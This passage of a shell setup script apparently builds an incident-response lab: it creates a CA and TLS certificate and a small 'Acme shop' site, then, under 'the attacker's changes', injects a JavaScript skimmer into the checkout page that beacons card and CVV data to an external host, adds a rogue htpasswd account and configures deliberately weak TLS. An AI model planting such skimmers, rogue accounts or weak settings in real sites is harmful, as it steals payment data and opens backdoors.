    openssl req -x509 -newkey rsa:2048 -nodes -keyout /lab/pki/ca.key -out /lab/pki/ca.crt \
      -days 365 -subj "/CN=Acme Internal CA" 2>/dev/null
    openssl req -new -newkey rsa:2048 -nodes -keyout /lab/nginx/tls/web.key -out "$t/web.csr" -subj "/CN=web.lab.test" 2>/dev/null
    printf 'subjectAltName=DNS:web.lab.test\nbasicConstraints=CA:FALSE\nextendedKeyUsage=serverAuth\n' > "$t/web.ext"
    openssl x509 -req -in "$t/web.csr" -CA /lab/pki/ca.crt -CAkey /lab/pki/ca.key -CAserial "$t/srl" -CAcreateserial \
      -days 90 -extfile "$t/web.ext" -out /lab/nginx/tls/web.crt 2>/dev/null
    openssl pkey -in /lab/nginx/tls/web.key -pubout > "$KL_STATE/oldpub"
    # the site as released
    H=/lab/nginx/html
    printf '<!doctype html><html><body><h1>Acme shop</h1><p>%s</p><a href="/shop/">Shop</a></body></html>\n' "$tok" > $H/index.html
    printf '<!doctype html><html><body><h1>About Acme</h1></body></html>\n' > $H/about.html
    printf '<!doctype html><html><body><h1>Products</h1><a href="/shop/checkout.html">Checkout</a></body></html>\n' > $H/shop/index.html
    cat > $H/shop/checkout.html <<'EOF'
    <!doctype html>
    <html><head><title>Checkout</title></head>
    <body>
    <form id="pay" method="post" action="/shop/pay">
      <input name="card" placeholder="Card number"><input name="cvv" placeholder="CVV">
      <button>Pay</button>
    </form>
    <script src="/shop/js/cart.js"></script>
    </body></html>
    EOF
    printf 'document.getElementById("pay").addEventListener("submit", function () { console.log("paying"); });\n' > $H/shop/js/cart.js
    printf '<!doctype html><html><body><h1>Admin</h1></body></html>\n' > $H/admin/index.html
    (cd $H && find . -type f | sort | xargs sha256sum) > /lab/release/SHA256SUMS
    tar -czf /lab/release/html.tar.gz -C $H .
    sha256sum /lab/release/SHA256SUMS /lab/release/html.tar.gz > "$KL_STATE/release"
    # the attacker's changes
    sed -i "s#</body></html>#<script src=\"/shop/js/$skim\"></script>\n</body></html>#" $H/shop/checkout.html
    cat > "$H/shop/js/$skim" <<EOF
    document.getElementById("pay").addEventListener("submit",function(e){navigator.sendBeacon("https://$host/c",new URLSearchParams(new FormData(e.target)));});
    EOF
    htpasswd -cb /lab/nginx/htpasswd ops "$pw" >/dev/null 2>&1
    htpasswd -b /lab/nginx/htpasswd "$rogue" "$rpw" >/dev/null 2>&1
    chmod 644 /lab/nginx/htpasswd
    cat > /lab/nginx/default.conf <<'EOF'
    server {
        listen 80;
        server_name _;
        server_tokens off;
        return 301 https://web.lab.test:8443$request_uri;
    }

    server {
        listen 443 ssl;
        server_name web.lab.test;
        root /etc/nginx/conf.d/html;
        index index.html;
        server_tokens off;

        ssl_certificate     /etc/nginx/conf.d/tls/web.crt;
        ssl_certificate_key /etc/nginx/conf.d/tls/web.key;
        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;
        ssl_ciphers 'ALL:!aNULL:@SECLEVEL=0';

